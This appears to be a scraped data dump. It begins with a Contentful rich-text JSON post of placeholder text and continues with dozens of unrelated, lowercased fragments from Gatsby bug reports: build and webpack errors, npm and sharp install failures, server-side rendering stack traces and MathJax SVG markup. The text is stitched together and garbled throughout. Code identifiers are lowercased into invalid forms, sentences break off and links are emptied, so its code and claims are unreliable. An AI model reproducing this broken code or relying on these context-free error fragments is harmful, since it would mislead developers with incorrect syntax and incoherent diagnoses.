{ "data": { "contentfulpost": { "id": "3875ab8b-3e1b-5f31-9f17-5f758065f109", "content": { "json": { "nodetype": "document", "data": {}, "content": [ { "nodetype": "paragraph", "content": [ { "nodetype": "text", "value": "one piece", "marks": [], "data": {} } ], "data": {} }, { "nodetype": "paragraph", "content": [ { "nodetype": "text", "value": "afafsasfdasdfasdf", "marks": [], "data": {} } ], "data": {} }, { "nodetype": "paragraph", "content": [ { "nodetype": "text", "value": "", "marks": [], "data": {} }, { "nodetype": "hyperlink", "content": [ { "nodetype": "text", "value": "one piece ", "marks": [], "data": {} } ], "data": { "uri": " " } }, { "nodetype": "text", "value": "", "marks": [], "data": {} } ], "data": {} }, { "nodetype": "embedded-asset-block", "content": [], "data": { "target": { "sys": { "id": "c1exk6yqumed5ubizqxc0v5", "type": "link", "linktype": "asset", "contentful_id": "1exk6yqumed5ubizqxc0v5" } } } }, { "nodetype": "paragraph", "content": [ { "nodetype": "text", "value": "", "marks": [], "data": {} } ], "data": {} } ] } } } }
the styles compilation is now throwing an error: ``` error #98123 webpack generating development javascript bundle failed // main style base file
import all style base blocks in proper order.
^ invalid css after "": expected 1 selector or at-rule, was "var content = requi" in /home/robert/programming/credijusto/landing-website/src/styles/index.scss (line 1, column 1) file: src/styles/index.scss failed re-building development bundle - 0.058s
``` the contents of _index.scss_ file that's throwing an error: ```
// main style base file
import all style base blocks in proper order.
// note: this is the only file from styles/ that should be imported in other
// our base styles
@import "./typography";
@import "./layout"; ``` and i import this file in a react component: ```
import { usestaticquery, graphql } from "gatsby";
import react from "react";
import proptypes from "prop-types"; import header from "~components/header";
import footer from "~components/footer"; // base styles (global - for all components)
import "~styles/index.scss"; function layout({ children }) { const data = usestaticquery(graphql` query sitetitlequery { site { sitemetadata { title } } } `); return ( <div> <header sitetitle={data.site.sitemetadata.title} /> <main>{children}</main> <footer /> </div> );
} layout.proptypes = { children: proptypes.node.isrequired,
}; export default layout;
the program works correctly, fetching data from strapi
but, while "npm run develop", the error message appears:
(node:43092) [dep0066] deprecationwarning: outgoingmessage.prototype._headers is deprecated
remains on the same page, changing only the title
the query erroneously returns the value "real-estate" e.g
no loeading forward slash.
on executing `gatsby develop`, it fails immediately after loading `gatsby-config.js`.
![screenshot from 2020-06-29 16-21-39](
- polyfill is missing
<img width="1905" alt="screenshot 2020-06-29 at 13 43 03" src=" ">
it fails to build.
page crashes as per above.
the component where the error happens is skipped and no error show up
it silently fails.
**uncaught (in promise) error: page resources for / not found
not rendering react at production-app.js:128 ** canvas does not render.
query failure: "cannot return null for non-nullable field tag.posts."
the links appear to be broken when clicked on (more keywords: non functional, not working)
when page is opened, blur is visible
after image is loaded blur does not disappear and final image is not visible.
when i manually replace`position: absolute` with`position: relative` on the `<img>`, final image is properly displayed, but blur still remains.
vscode doesn't find the gatsby module or type declarations
failed building static html for pages - 3.497s error #95312 "window" is not available during server side rendering
see our docs page for more info on this error: webpackerror: referenceerror: window is not defined - build-html.js:107 dobuildpages [zeitouni]/[gatsby]/dist/commands/build-html.js:107:24 - build-html.js:121 async buildhtml [zeitouni]/[gatsby]/dist/commands/build-html.js:121:3 - build.js:219 async build [zeitouni]/[gatsby]/dist/commands/build.js:219:5 ```
failed building static html for pages - 3.497s error #95312 "window" is not available during server side rendering
see our docs page for more info on this error: webpackerror: referenceerror: window is not defined - build-html.js:107 dobuildpages [zeitouni]/[gatsby]/dist/commands/build-html.js:107:24 - build-html.js:121 async buildhtml [zeitouni]/[gatsby]/dist/commands/build-html.js:121:3 - build.js:219 async build [zeitouni]/[gatsby]/dist/commands/build.js:219:5 ```
i got this error instead: unknown field 'metafield' on type 'shopifyproduct'
the image background color is white, no matter the value entered to `backgroundcolor` in `gatsby-config.js`.
the current lint configuration is failing the build for every docs pr.
- query error - app crash
i get errors: - the gatsby-source-cloudinary plugin has generated no gatsby nodes
do you need it?
- cannot query field "allcloudinarymedia" on type "query".
i'm getting this error:
remote: failed building production javascript and css bundles - 2.048s
remote: error generating javascript bundles failed
remote: remote: [babel] /tmp/build_94433f4f74941a672629446cec5e493e/.cache/production-app.js: cannot find module '@babel/compat-data/corejs3-shipped-proposals'
remote: require stack:
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/@babel/preset-env/lib/polyfills/corejs3/usage-plugin.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/@babel/preset-env/lib/index.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/@babel/core/lib/config/files/plugins.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/@babel/core/lib/config/files/index.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/@babel/core/lib/index.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/babel-loader/lib/index.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/gatsby/dist/utils/babel-loader.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/loader-runner/lib/loadloader.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/loader-runner/lib/loaderrunner.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/webpack/lib/normalmodule.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/webpack/lib/normalmodulefactory.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/webpack/lib/compiler.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/webpack/lib/webpack.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/gatsby/dist/commands/build-html.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/gatsby/dist/commands/build.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/gatsby/node_modules/gatsby-cli/lib/create-cli.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/gatsby/node_modules/gatsby-cli/lib/index.js
remote: - /tmp/build_94433f4f74941a672629446cec5e493e/node_modules/gatsby/dist/bin/gatsby.js
remote: not finished run queries - 8.739s
remote: not finished generating image thumbnails - 8.691s
remote: remote: (sharp:10805): glib-critical **: 13:28:07.415: g_hash_table_lookup: assertion 'hash_table != null' failed
remote: remote: (sharp:10805): glib-critical **: 13:28:07.416: g_hash_table_lookup: assertion 'hash_table != null' failed
remote: remote: (sharp:10805): glib-critical **: 13:28:07.589: g_hash_table_lookup: assertion 'hash_table != null' failed
remote: npm err! code elifecycle
remote: npm err! errno 1
remote: npm err! gatsby-starter-default@0.1.0 build: `gatsby build`
remote: npm err! exit status 1
remote: npm err! remote: npm err! failed at the gatsby-starter-default@0.1.0 build script.
remote: npm err! this is probably not a problem with npm
there is likely additional logging output above.
when running ```npm install``` after clearing npm cache and deleting node_modules i get the error below:
gyp err! system darwin 19.4.0
gyp err! command "/usr/local/cellar/node/14.4.0/bin/node" "/usr/local/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js" "rebuild"
gyp err! cwd /users/eliran/code/gatsby/zeitouni/node_modules/sharp
gyp err! node -v v14.4.0
gyp err! node-gyp -v v5.1.0
gyp err! not ok npm err! code elifecycle
npm err! errno 1
npm err! sharp@0.23.4 install: `(node install/libvips && node install/dll-copy && prebuild-install) || (node-gyp rebuild && node install/dll-copy)`
npm err! exit status 1
npm err! npm err! failed at the sharp@0.23.4 install script.
npm err! this is probably not a problem with npm
there is likely additional logging output above
navigating to name\\>:8000 in a browser shows: ```
this site can't provide a secure connection <host name> sent an invalid response
err_ssl_protocol_error
``` using openssl, returns ```
4612808300:error:1400410b:ssl routines:connect_cr_srvr_hello:wrong version number:/appleinternal/buildroot/library/caches/com.apple.xbs/sources/libressl/libressl-47.120.1/libressl-2.8/ssl/ssl_pkt.c:386:
no peer certificate available
no client certificate ca names sent
ssl handshake has read 5 bytes and written 0 bytes
new, (none), cipher is (none)
secure renegotiation is not supported
compression: none
expansion: none
no alpn negotiated
ssl-session: protocol : tlsv1.2 cipher : 0000 session-id: session-id-ctx: master-key: start time: 1592962536 timeout : 7200 (sec) verify return code: 0 (ok)
we get a crash, because queryselector complains that it isn't a valid selector.
- 404 for all source links: ### related code www/src/components/api-reference/doc-block.js ### related issues
tags are rendered in client side, which is bad
build error occurred
build fails
now throwing error as
``` $ gatsby build
11:55:23 am: /opt/build/repo/node_modules/yoga-layout-prebuilt/yoga-layout/build/release/nbind.js:53
11:55:23 am: throw ex;
11:55:23 am: ^
11:55:23 am: error: cannot find module 'acorn'
11:55:23 am: require stack:
11:55:23 am: - /opt/build/repo/node_modules/acorn-jsx/index.js
11:55:23 am: - /opt/build/repo/node_modules/buble-jsx-only/dist/buble.cjs.js
accessing your contentful space failed.
try setting gatsby_contentful_offline=true to see if we can serve from cache
used options:
spaceid: "*********7gs"
accesstoken: "***************************************jtj0"
host (default value): "cdn.contentful.com"
environment (default value): "master"
downloadlocal (default value): false
localefilter (default value): [function]
forcefullsync (default value): false
pagelimit (default value): 100
usenameforid (default value): true not finished source and transform nodes - 0.732s
npm err! code elifecycle
npm err! errno 1
npm err! the-fearless-group-app@0.1.0 dev: `gatsby develop`
npm err! exit status 1
npm err! npm err! failed at the the-fearless-group-app@0.1.0 dev script.
npm err! this is probably not a problem with npm
there is likely additional logging output above
npm err! a complete log of this run can be found in:
npm err! /users/s121003/.npm/_logs/2020-06-20t10_10_09_565z-debug.log
s121003@macbook-pro tfg-app % ```
i have an image that is 720 x 1080 and that gets sized to 270 x 405.
gatsby build error:
``` { node: { id: 'b1efc1a8-4107-57c1-a6a1-01e7681164a9', excerpt: 'para que el alumnado y el profesorado de nuestro centro puedan trabajar con aeducar, necesitar tener una cuenta con la que acceder a la plataforma
en cada centro, la persona que realice las tareas de gesti de aeducar ser la encargada de la ', frontmatter: [object] } }
] *******************************************************
/home/juanda/web-aeducar/node_modules/yoga-layout-prebuilt/yoga-layout/build/release/nbind.js:53 throw ex; ^ error: write epipe
the site gets stuck on a browser error page
maybe it's an issue with the service worker? ![browser screenshot of edge with the message this page is having a problem loading](
![screen shot 2020-06-19 at 3 49 37 pm]( instead of the expected text, we see what i presume is jsx
this is the html as shown in inspecting the `<figcaption>` element and getting its raw inner html:
/* @jsx mdx */ const makeshortcode = name =&gt; function mdxdefaultshortcode(props) { console.warn("component " + name + " was not imported, exported, or provided by mdxprovider as global scope") return <div>
}; const layoutprops = { };
const mdxlayout = "wrapper"
export default function mdxcontent({ components, ...props
}) { return <mdxlayout mdxtype="mdxlayout" components="{components}"> <p>{`[object object]`}</p> </mdxlayout>;
mdxcontent.ismdxcomponent = true;</div>
i suspect that the closing `<div>` is chrome trying to make sense of the text.
it doesn't.
gatsby throws the following error - ```
4:36:49 pm: error in /opt/build/repo/node_modules/gatsby/node_modules/gatsby-cli/lib/reporter/reporter.d.ts(23,25):
4:36:49 pm: 23:25 could not find a declaration file for module 'common-tags'
'/opt/build/repo/node_modules/common-tags/lib/index.js' implicitly has an 'any' type.
4:36:49 pm: try `npm install @types/common-tags` if it exists or add a new declaration (.d.ts) file containing `declare module 'common-tags';`
4:36:49 pm: 21 | * strip initial indentation template function.
4:36:49 pm: 22 | */
4:36:49 pm: > 23 | stripindent: import("common-tags").templatetag;
4:36:49 pm: | ^
4:36:49 pm: 24 | format: import("chalk").chalk & {
4:36:49 pm: 25 | supportscolor: import("chalk").colorsupport;
4:36:49 pm: 26 | };
4:36:49 pm: not finished generating image thumbnails - 24.139s
page goes blank
this is logged in the browser console: ```
syntaxerror: "syntax error: expected name, found } (131:1) 129 | 130 | > 131 | } | ^ 132 | 133 | input imagesharpfixedfilterinput { 134 | " parse parser-graphql.js:1 parse parser-graphql.js:1 parse standalone.js:13721 hs standalone.js:17145 ws standalone.js:17381 formatwithcursor standalone.js:17397 dd standalone.js:32917 format standalone.js:32926 prettify utils.ts:22 l createsdl.ts:94 componentdidmount sdleditor.tsx:36 react 2 unstable_runwithpriority scheduler.production.min.js:19 react 4 unstable_runwithpriority scheduler.production.min.js:19 react 5
react_devtools_backend.js:6:7472
localhost:8000 show this error `error: it appears like gatsby is misconfigured
jsonstore is gatsby internal development-only component and should never be used in production
unless your site has a complex or custom webpack/gatsby configuration this is likely a bug in gatsby
please report this at with steps to reproduce this error.
module../.cache/query-result-store.js
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/.cache/query-result-store.js:13 10 | import normalizepagepath from "./normalize-page-path" 11 | 12 | if (process.env.node_env === `production`) {
> 13 | throw new error( 14 | `it appears like gatsby is misconfigured
jsonstore is gatsby internal ` + 15 | `development-only component and should never be used in production.\ \ ` + 16 | `unless your site has a complex or custom webpack/gatsby ` +
view compiled
__webpack_require__
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:789 786 | }; 787 | 788 | // execute the module function
> 789 | modules[moduleid].call(module.exports, module, module.exports, hotcreaterequire(moduleid)); 790 | 791 | // flag the module as loaded 792 | module.l = true;
view compiled
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:100 97 | ); 98 | hotcurrentparents = []; 99 | }
> 100 | return __webpack_require__(request); 101 | }; 102 | var objectfactory = function objectfactory(name) { 103 | return {
view compiled
module../.cache/public-page-renderer-dev.js
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/.cache/public-page-renderer-dev.js:1
> 1 | import react from "react" 2 | import proptypes from "prop-types" 3 | 4 | import loader from "./loader"
view compiled
__webpack_require__
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:789 786 | }; 787 | 788 | // execute the module function
> 789 | modules[moduleid].call(module.exports, module, module.exports, hotcreaterequire(moduleid)); 790 | 791 | // flag the module as loaded 792 | module.l = true;
view compiled
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:100 97 | ); 98 | hotcurrentparents = []; 99 | }
> 100 | return __webpack_require__(request); 101 | }; 102 | var objectfactory = function objectfactory(name) { 103 | return {
view compiled
./.cache/public-page-renderer.js
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/.cache/public-page-renderer.js:4 1 | const preferdefault = m => (m && m.default) || m 2 | 3 | if (process.env.build_stage === `develop`) {
> 4 | module.exports = preferdefault(require(`./public-page-renderer-dev`)) 5 | } else if (process.env.build_stage === `build-javascript`) { 6 | module.exports = preferdefault(require(`./public-page-renderer-prod`)) 7 | } else {
view compiled
__webpack_require__
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:789 786 | }; 787 | 788 | // execute the module function
> 789 | modules[moduleid].call(module.exports, module, module.exports, hotcreaterequire(moduleid)); 790 | 791 | // flag the module as loaded 792 | module.l = true;
view compiled
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:100 97 | ); 98 | hotcurrentparents = []; 99 | }
> 100 | return __webpack_require__(request); 101 | }; 102 | var objectfactory = function objectfactory(name) { 103 | return {
view compiled
module../.cache/gatsby-browser-entry.js
__webpack_require__
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:789 786 | }; 787 | 788 | // execute the module function
> 789 | modules[moduleid].call(module.exports, module, module.exports, hotcreaterequire(moduleid)); 790 | 791 | // flag the module as loaded 792 | module.l = true;
view compiled
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:100 97 | ); 98 | hotcurrentparents = []; 99 | }
> 100 | return __webpack_require__(request); 101 | }; 102 | var objectfactory = function objectfactory(name) { 103 | return {
view compiled
module../src/components/layout.js
__webpack_require__
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:789 786 | }; 787 | 788 | // execute the module function
> 789 | modules[moduleid].call(module.exports, module, module.exports, hotcreaterequire(moduleid)); 790 | 791 | // flag the module as loaded 792 | module.l = true;
view compiled
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:100 97 | ); 98 | hotcurrentparents = []; 99 | }
> 100 | return __webpack_require__(request); 101 | }; 102 | var objectfactory = function objectfactory(name) { 103 | return {
view compiled
module../src/pages/about.js
__webpack_require__
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:789 786 | }; 787 | 788 | // execute the module function
> 789 | modules[moduleid].call(module.exports, module, module.exports, hotcreaterequire(moduleid)); 790 | 791 | // flag the module as loaded 792 | module.l = true;
view compiled
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:100 97 | ); 98 | hotcurrentparents = []; 99 | }
> 100 | return __webpack_require__(request); 101 | }; 102 | var objectfactory = function objectfactory(name) { 103 | return {
view compiled
./.cache/sync-requires.js
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/.cache/sync-requires.js:8 5 | 6 | 7 | exports.components = {
> 8 | "component---src-pages-about-js": hot(preferdefault(require("/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/src/pages/about.js"))), 9 | "component---src-pages-index-js": hot(preferdefault(require("/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/src/pages/index.js"))), 10 | "component---src-pages-my-files-js": hot(preferdefault(require("/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/src/pages/my-files.js"))), 11 | "component---src-templates-blog-post-js": hot(preferdefault(require("/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/src/templates/blog-post.js")))
view compiled
__webpack_require__
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:789 786 | }; 787 | 788 | // execute the module function
> 789 | modules[moduleid].call(module.exports, module, module.exports, hotcreaterequire(moduleid)); 790 | 791 | // flag the module as loaded 792 | module.l = true;
view compiled
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:100 97 | ); 98 | hotcurrentparents = []; 99 | }
> 100 | return __webpack_require__(request); 101 | }; 102 | var objectfactory = function objectfactory(name) { 103 | return {
view compiled
module../.cache/app.js
__webpack_require__
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:789 786 | }; 787 | 788 | // execute the module function
> 789 | modules[moduleid].call(module.exports, module, module.exports, hotcreaterequire(moduleid)); 790 | 791 | // flag the module as loaded 792 | module.l = true;
view compiled
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:100 97 | ); 98 | hotcurrentparents = []; 99 | }
> 100 | return __webpack_require__(request); 101 | }; 102 | var objectfactory = function objectfactory(name) { 103 | return {
view compiled
__webpack_require__
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:789 786 | }; 787 | 788 | // execute the module function
> 789 | modules[moduleid].call(module.exports, module, module.exports, hotcreaterequire(moduleid)); 790 | 791 | // flag the module as loaded 792 | module.l = true;
view compiled
(anonymous function)
/volumes/storage/code/js/gatsby/offical-tutorial/gatsby-04-07-data/webpack/bootstrap:856 853 | 854 | 855 | // load entry module and return exports
> 856 | return hotcreaterequire(0)(__webpack_require__.s = 0); 857 | view compiled
(anonymous function)
this screen is visible only in development
it will not appear if the app crashes in production.
open your browser developer console to further inspect this error.
but i am getting this: ![image](
it's a blank line, except for a brief moment/frame, where the progress is updated(download completed or new one started triggered it), and then it's blank again.
build failed without error message
the second (gatsby) example produces the following html (excerpt):
<p><span class="math math-inline"> <mjx-container classname="mathjax" jax="svg"><svg xmlns=" " width="1.541ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 681 683" xmlnsxlink=" " style="vertical-align: 0px;"> <defs> <path id="mjx-1-tex-i-1d43f" d="m228 637q194 637 192 641q191 643 191 649q191 673 202 682q204 683 217 683q271 680 344 680q485 680 506 683h518q524 677 524 674t522 656q517 641 513 637h475q406 636 394 628q387 624 380 600t313 336q297 271 279 198t252 88l243 52q243 48 252 48t311 46h328q360 46 379 47t428 54t478 72t522 106t564 161q580 191 594 228t611 270q616 273 628 273h641q647 264 647 262t627 203t583 83t557 9q555 4 553 3t537 0t494 -1q483 -1 418 -1t294 0h116q32 0 32 10q32 17 34 24q39 43 44 45q48 46 59 46h65q92 46 125 49q139 52 144 61q147 65 216 339t285 628q285 635 228 637z"> </path> </defs> <g stroke="currentcolor" fill="currentcolor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"> <g data-mml-node="math"> <g data-mml-node="mi"> <use xlinkhref="#mjx-1-tex-i-1d43f"></use> </g> </g> </g> </svg></mjx-container> </span></p>
<div class="math math-display"> <mjx-container classname="mathjax" jax="svg" display="true"><svg xmlns=" " width="1.541ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 681 683" xmlnsxlink=" " style="vertical-align: 0px;"> <defs> <path id="mjx-2-tex-i-1d43f" d="m228 637q194 637 192 641q191 643 191 649q191 673 202 682q204 683 217 683q271 680 344 680q485 680 506 683h518q524 677 524 674t522 656q517 641 513 637h475q406 636 394 628q387 624 380 600t313 336q297 271 279 198t252 88l243 52q243 48 252 48t311 46h328q360 46 379 47t428 54t478 72t522 106t564 161q580 191 594 228t611 270q616 273 628 273h641q647 264 647 262t627 203t583 83t557 9q555 4 553 3t537 0t494 -1q483 -1 418 -1t294 0h116q32 0 32 10q32 17 34 24q39 43 44 45q48 46 59 46h65q92 46 125 49q139 52 144 61q147 65 216 339t285 628q285 635 228 637z"> </path> </defs> <g stroke="currentcolor" fill="currentcolor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"> <g data-mml-node="math"> <g data-mml-node="mi"> <use xlinkhref="#mjx-2-tex-i-1d43f"></use> </g> </g> </g> </svg></mjx-container>
<style> mjx-container[jax="svg"] { direction: ltr; } mjx-container[jax="svg"]>svg { overflow: visible; } mjx-container[jax="svg"]>svg a { fill: blue; stroke: blue; } mjx-container[jax="svg"][display="true"] { display: block; text-align: center; margin: 1em 0; } mjx-container[jax="svg"][display="true"][width="full"] { display: flex; } mjx-container[jax="svg"][justify="left"] { text-align: left; } mjx-container[jax="svg"][justify="right"] { text-align: right; } g[data-mml-node="merror"]>g { fill: red; stroke: red; } g[data-mml-node="merror"]>rect[data-background] { fill: yellow; stroke: none; } g[data-mml-node="mtable"]>line[data-line] { stroke-width: 70px; fill: none; } g[data-mml-node="mtable"]>rect[data-frame] { stroke-width: 70px; fill: none; } g[data-mml-node="mtable"]>.mjx-dashed { stroke-dasharray: 140; } g[data-mml-node="mtable"]>.mjx-dotted { stroke-linecap: round; stroke-dasharray: 0, 140; } g[data-mml-node="mtable"]>g>svg { overflow: visible; } [jax="svg"] mjx-tool { display: inline-block; position: relative; width: 0; height: 0; } [jax="svg"] mjx-tool>mjx-tip { position: absolute; top: 0; left: 0; } mjx-tool>mjx-tip { display: inline-block; padding: .2em; border: 1px solid #888; font-size: 70%; background-color: #f8f8f8; color: black; box-shadow: 2px 2px 5px #aaaaaa; } g[data-mml-node="maction"][data-toggle] { cursor: pointer; } mjx-status { display: block; position: fixed; left: 1em; bottom: 1em; min-width: 25%; padding: .2em .4em; border: 1px solid #888; font-size: 90%; background-color: #f8f8f8; color: black; } foreignobject[data-mjx-xml] { font-family: initial; line-height: normal; overflow: visible; } .mathjax path { stroke-width: 3; }
``` if you compare the two outputs you will notice that the attributes in the mjx-container tags (and inner tags) have had their attributes translated to camel-case
this produces an incorrect svg, and no image will be drawn
these attribute name translations are the only differences between the outputs.
the responsive image has the dimensions of the desktop image
things like `es6.promise` still appear in the final production bundle.
gatsby sends requests to socket.io at port> which ends in access violation errors.
![image](
there is error in console telling **uncaught referenceerror: firebase is not defined**
the build fails.
going to `localhost:8000` displays the following error and infinitely reloads: <img width="1206" alt="screenshot 2020-06-12 at 10 25 48" src=" "> however navigating to `127.0.0.0:8000` works just fine.
texts of ui components that are sourced from the updated query structure were empty on the initial load
they were displayed on subsequent loads.
using words `import` and `export` produce an error
instead of using the local code changes, tests were using the installed version in the package.json.
note that this didn't happen every time **gatsby-dev** was run, sometimes did, sometimes not, inconsitently.
the axios request inside the `base64img` function fails with a 502 and throws an uncaught error, resulting in a build failure
<img width="987" alt="screen shot 2020-06-09 at 11 56 08 am" src=" ">
npm's module resolution had`^0.2.x` go to `0.4.x` and broke due to a semver misuse.
`gtag(\'config\', \'aw-google_ad_words\', {"anonymize_ip":false,"optimize_id":"gtm-container","send_page_view":false});gtag(\'config\', \'ua-google_analytics\', {"anonymize_ip":false,"optimize_id":"gtm-container","send_page_view":false});`
the page scrolls to the top in firefox, but not in safari
in a _nested_ route (ie '/dashboard/orders') all vendor files are unable to be loaded: `uncaught syntaxerror: unexpected token '<'` top level routes work fine (ie '/dashboard').
error enoent: no such file or directory, stat '/users/allie/src/blep/website/static/charting_library' error: enoent: no such file or directory, stat '/users/allie/src/blep/website/static/charting_library' - polyfills.js:307 object.statsync [website]/[graceful-fs]/polyfills.js:307:34 - stat.js:58 getstatssync [website]/[fs-extra]/lib/util/stat.js:58:18 - stat.js:90 object.checkpathssync [website]/[fs-extra]/lib/util/stat.js:90:33 - copy-sync.js:119 copydiritem [website]/[fs-extra]/lib/copy-sync/copy-sync.js:119:29 - copy-sync.js:113 [website]/[fs-extra]/lib/copy-sync/copy-sync.js:113:39 - array.foreach - copy-sync.js:113 copydir [website]/[fs-extra]/lib/copy-sync/copy-sync.js:113:23 - copy-sync.js:103 ondir [website]/[fs-extra]/lib/copy-sync/copy-sync.js:103:10 - copy-sync.js:45 getstats [website]/[fs-extra]/lib/copy-sync/copy-sync.js:45:37 - copy-sync.js:38 startcopy [website]/[fs-extra]/lib/copy-sync/copy-sync.js:38:10 - copy-sync.js:33 handlefilterandcopy [website]/[fs-extra]/lib/copy-sync/copy-sync.js:33:10 - copy-sync.js:26 object.copysync [website]/[fs-extra]/lib/copy-sync/copy-sync.js:26:10 - get-static-dir.js:38 [website]/[gatsby]/dist/utils/get-static-dir.js:38:35 - array.map - get-static-dir.js:38 copystaticdirs [website]/[gatsby]/dist/utils/get-static-dir.js:38:4 not finished run queries - 0.053s
error command failed with exit code 1.
unhandled rejection enoent: no such file or directory, open 'async c:\\users\\mathew\\development\\dive-club-gatsby\ ode_modules\\gatsby-source-google-spreadsheet\\gatsby-node.js' error: enoent: no such file or directory, open 'async c:\\users\\mathew\\development\\dive-club-gatsby\ ode_modules\\gatsby-source-google-spreadsheet\\gatsby-node.js' - api-runner-node.js:395 [dive-club-gatsby]/[gatsby]/dist/utils/api-runner-node.js:395:25 - util.js:16 trycatcher [dive-club-gatsby]/[bluebird]/js/release/util.js:16:23 - promise.js:547 promise._settlepromisefromhandler [dive-club-gatsby]/[bluebird]/js/release/promise.js:547:31 - promise.js:604 promise._settlepromise [dive-club-gatsby]/[bluebird]/js/release/promise.js:604:18 - promise.js:649 promise._settlepromise0 [dive-club-gatsby]/[bluebird]/js/release/promise.js:649:10 - promise.js:725 promise._settlepromises [dive-club-gatsby]/[bluebird]/js/release/promise.js:725:18 - async.js:93 _drainqueuestep [dive-club-gatsby]/[bluebird]/js/release/async.js:93:12 - async.js:86 _drainqueue [dive-club-gatsby]/[bluebird]/js/release/async.js:86:9 - async.js:102 async._drainqueues [dive-club-gatsby]/[bluebird]/js/release/async.js:102:5 - async.js:15 immediate.async.drainqueues [as _onimmediate] [dive-club-gatsby]/[bluebird]/js/release/async.js:15:14 - timers.js:456 processimmediate internal/timers.js:456:21 not finished source and transform nodes - 11.189s
``` error #11328 a page component must export a react component for it to be valid
please make sure this file exports a react component: undefined not finished createpagesstatefully - 0.039s
error command failed with exit code 1.
info visit for documentation about this command.
warn [gatsby-plugin-graphql-codegen] unable to find any graphql type definitions for the following
pointers: - /users/aswin/documents/workbackup/test
failed we've encountered an error: objects are not valid as a react child (found: graphqldocumenterror: graphqldocumenterror: unknown fragment
"gatsbyimagesharpfluid".)
if you meant to render a collection of
children, use an array instead
in div (created by box) in box in unknown (created by cli) in div (created by static) in static (created by cli) in div (created by box) in box (created by cli) in div (created by box) in box (created by cli) in cli (created by connectedcli)
error #98123 webpack
need to restart gatsby develop
error in the bundle:
error #98124 webpack generating development javascript bundle failed can't resolve 'fs' in '/volumes/projects/gatsby-site/node_modules/@babel/core/lib/transformation' if you're trying to use a package make sure that 'fs' is installed
if you're trying to use a local file make sure that the path is correct
file: node_modules/@babel/core/lib/transformation/normalize-file.js
the images always blur up when loading
the specific error is: ```
referenceerror: __base_path__ is not defined
build breaks.
kyle's picture is missing.
node_modules/gatsby/index.d.ts:14:27 - error ts2307: cannot find module './src/bootstrap/load-plugins/types' or its corresponding type declarations
14 import { pluginref } from "./src/bootstrap/load-plugins/types" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ found 1 error
error command failed with exit code 1.
<img width="506" alt="screenshot 2020-06-03 23 32 32" src=" "> crosslinking issue #22070
the image is displayed with a 16x9 aspect-ratio.
typeerror: string.substr is not a function
src/akl-method/node_modules/@reach/router/es/lib/utils.js:6 3 | //////////////////////////////////////////////////////////////////////////////// 4 | // startswith(string, search) - check if `string` starts with `search` 5 | var startswith = function startswith(string, search) {
> 6 | return string.substr(0, search.length) === search; 7 | }; 8 | 9 | ////////////////////////////////////////////////////////////////////////////////
even though the theme prop has `lightlogo: false`, the logo in the header on the homepage as the fill of `#fff`
doesn't show.
seems like the types of the cache in the gatsby-source-filesystem changed and no longer matches the types from gatsby itself.
pagequery didn't reflect changes in file tree, even though they're visible in graphiql
may be related to something that isn't hooked up in the data dependency tracking, specifically around the frontmatter values in mdx files? <details> <summary>
<b>environment</b>
